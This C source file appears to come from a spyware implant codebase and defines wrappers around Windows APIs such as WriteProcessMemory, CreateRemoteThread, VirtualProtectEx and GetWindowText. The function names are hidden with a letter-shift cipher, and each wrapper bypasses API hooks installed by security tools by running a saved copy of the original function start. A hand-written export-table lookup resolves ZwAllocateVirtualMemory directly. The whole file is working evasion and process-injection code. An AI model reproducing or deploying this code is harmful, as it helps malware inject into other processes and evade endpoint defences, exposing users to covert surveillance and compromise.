#include "HM_PreamblePatch.h"
#include "common.h"

LRESULT WINAPI HM_SafeSendMessageTimeoutW(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam, UINT fuflags, UINT utimeout, PDWORD_PTR lpdwresult)
{
	static PBYTE pBytes = NULL;
	CHAR cDll[] = {"user32.dll"}, cFunc[] = {"TfoeNfttbhfUjnfpvuX"};
	
	if(HM_IsWrapped(cDll, cFunc) == FALSE){
		return FNC(SendMessageTimeoutW)(hwnd, msg, wparam, lparam, fuflags, utimeout, lpdwresult);
	}else{
		if(pBytes == NULL)
			if(HM_ReadFunction(cDll, cFunc, 5, &pBytes) == 0)
				return FNC(SendMessageTimeoutW)(hwnd, msg, wparam, lparam, fuflags, utimeout, lpdwresult);
	}

	HM_WINAPI(pBytes);
}

BOOL WINAPI HM_SafeVirtualProtectEx(HANDLE hProcess, LPVOID lpBaseAddress, SIZE_T nSize, DWORD flNewProtect, PDWORD lpflOldProtect)
{
	static PBYTE pBytes = NULL;
	CHAR cDll[] = {"kernel32.dll"}, cFunc[] = {"WjsuvbmQspufduFy"};
	
	if(HM_IsWrapped(cDll, cFunc) == FALSE){
		return FNC(VirtualProtectEx)(hProcess, lpBaseAddress, nSize, flNewProtect, lpflOldProtect);
	}else{
		if(pBytes == NULL)
			if(HM_ReadFunction(cDll, cFunc, 5, &pBytes) == 0)
				return FNC(VirtualProtectEx)(hProcess, lpBaseAddress, nSize, flNewProtect, lpflOldProtect);
	}

	HM_WINAPI(pBytes);
}

BOOL WINAPI HM_SafeWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten)
{
	static PBYTE pBytes = NULL;
	CHAR cDll[] = {"kernel32.dll"}, cFunc[] = {"XsjufQspdfttNfnpsz"};
	
	if(HM_IsWrapped(cDll, cFunc) == FALSE){
		return FNC(WriteProcessMemory)(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
	}else{
		if(pBytes == NULL)
			if(HM_ReadFunction(cDll, cFunc, 5, &pBytes) == 0)
				return FNC(WriteProcessMemory)(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
	}

	HM_WINAPI(pBytes);
}

BOOL WINAPI HM_SafeReadProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead)
{
	static PBYTE pBytes = NULL;
	CHAR cDll[] = {"kernel32.dll"}, cFunc[] = {"SfbeQspdfttNfnpsz"};
	
	if(HM_IsWrapped(cDll, cFunc) == FALSE){
		return FNC(ReadProcessMemory)(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
	}else{
		if(pBytes == NULL)
			if(HM_ReadFunction(cDll, cFunc, 5, &pBytes) == 0)
				return FNC(ReadProcessMemory)(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
	}

	HM_WINAPI(pBytes);
}

HANDLE WINAPI HM_SafeCreateRemoteThread(HANDLE hProcessRem, 
								 LPSECURITY_ATTRIBUTES lpThreadAttributes,
								 SIZE_T dwStackSize,
								 LPTHREAD_START_ROUTINE lpStartAddress,
								 LPVOID lpParameter,
								 DWORD dwCreationFlags,
								 LPDWORD lpThreadId)
{
	static PBYTE pBytes = NULL;
	CHAR cDll[] = {"kernel32.dll"}, cFunc[] = {"DsfbufSfnpufUisfbe"};
	
	if(HM_IsWrapped(cDll, cFunc) == FALSE){
		return FNC(CreateRemoteThread)(hProcessRem, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
	}else{
		if(pBytes == NULL)
			if(HM_ReadFunction(cDll, cFunc, 5, &pBytes) == 0)
				return FNC(CreateRemoteThread)(hProcessRem, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
	}

	HM_WINAPI(pBytes);
}


HANDLE WINAPI HM_SafeCreateThread(	LPSECURITY_ATTRIBUTES lpThreadAttributes,
									SIZE_T dwStackSize,
									LPTHREAD_START_ROUTINE lpStartAddress,
									LPVOID lpParameter,
									DWORD dwCreationFlags,
									LPDWORD lpThreadId)
{
	return HM_SafeCreateRemoteThread(FNC(GetCurrentProcess)(), lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
}

void *HM_SafeGetProcAddress(HMODULE hModule, char *func_to_search)
{
	BYTE *ImageBase = (BYTE *)hModule;
	WORD *PeOffs;
	IMAGE_NT_HEADERS *PE_Header;
	MY_IMAGE_EXPORT_DESCRIPTOR *Dll_Export;
	DWORD Index;
	unsigned short *Ordinal;
	DWORD *pFuncName;
	DWORD *pFunc_Pointer;

	if (!ImageBase)
		return NULL;

	// Verifica che sia un PE
	if (ImageBase[0]!='M' || ImageBase[1]!='Z')
		return NULL;
		
	PeOffs = (WORD *)&(ImageBase[0x3C]);
	PE_Header = (IMAGE_NT_HEADERS *)(ImageBase + (*PeOffs));
	// Qualche controllo sugli headers
	if (PE_Header->Signature != 0x00004550 || PE_Header->OptionalHeader.NumberOfRvaAndSizes < 1 ||
		PE_Header->OptionalHeader.DataDirectory[0].VirtualAddress == 0) 
		return NULL;

	Dll_Export = (MY_IMAGE_EXPORT_DESCRIPTOR *) (ImageBase + PE_Header->OptionalHeader.DataDirectory[0].VirtualAddress);
	// Scorre la lista di DLL importate
	for (Index=0; Index < Dll_Export->NumberOfNames ; Index++) {	
		pFuncName = (DWORD *)(ImageBase + Dll_Export->AddressOfNames + Index*4);
		if (*pFuncName == NULL)
			continue;			
		// Vede se e' la funzione che cerchiamo
		if (!strcmp(func_to_search, (char *)(ImageBase + *pFuncName)))
			break;
	}
	
	if(Index >= Dll_Export->NumberOfNames)
		return NULL;

	// Legge Ordinale
	Ordinal = (unsigned short *) (ImageBase + Dll_Export->AddressOfNameOrdinals + Index*2);
	// Legge il puntatore a funzione
	pFunc_Pointer = (DWORD *) (ImageBase + Dll_Export->AddressOfFunctions + (*Ordinal)*4);
	return (ImageBase + *pFunc_Pointer);
}


typedef NTSTATUS  (__stdcall *ZwAllocateVirtualMemory_t)(HANDLE, PVOID, ULONG, PSIZE_T, ULONG, ULONG); 
LPVOID WINAPI HM_SafeVirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
{
	LPVOID buffer = lpAddress;
	SIZE_T region_size = dwSize;
	ZwAllocateVirtualMemory_t pZwAllocateVirtualMemory;
	HMODULE hntdll;

	if (!(hntdll = GetModuleHandle("NTDLL.dll")))
		return NULL;

	if ( !(pZwAllocateVirtualMemory = (ZwAllocateVirtualMemory_t)HM_SafeGetProcAddress(hntdll, "ZwAllocateVirtualMemory")) )
		return NULL;

	__try {
		if ( pZwAllocateVirtualMemory(hProcess, &buffer, 0, &region_size, flAllocationType, flProtect) != 0 )
			return NULL;
	} __except(EXCEPTION_EXECUTE_HANDLER){
		return NULL;
	}

	return buffer;
}

int WINAPI HM_SafeGetWindowTextW(HWND hWnd, LPWSTR lpString, int nMaxCount)
{
	static PBYTE pBytes = NULL;
	CHAR cDll[] = {"user32.dll"}, cFunc[] = {"HfuXjoepxUfyuX"};
	
	if(HM_IsWrapped(cDll, cFunc) == FALSE){
		return FNC(GetWindowTextW)(hWnd, lpString, nMaxCount);
	}else{
		if(pBytes == NULL)
			if(HM_ReadFunction(cDll, cFunc, 5, &pBytes) == 0)
				return FNC(GetWindowTextW)(hWnd, lpString, nMaxCount);
	}

	HM_WINAPI(pBytes);
}

int WINAPI HM_SafeGetWindowTextA(HWND hWnd, LPSTR lpString, int nMaxCount)
{
	static PBYTE pBytes = NULL;
	CHAR cDll[] = {"user32.dll"}, cFunc[] = {"HfuXjoepxUfyuB"};
	
	if(HM_IsWrapped(cDll, cFunc) == FALSE){
		return FNC(GetWindowTextA)(hWnd, lpString, nMaxCount);
	}else{
		if(pBytes == NULL)
			if(HM_ReadFunction(cDll, cFunc, 5, &pBytes) == 0)
				return FNC(GetWindowTextA)(hWnd, lpString, nMaxCount);
	}

	HM_WINAPI(pBytes);
}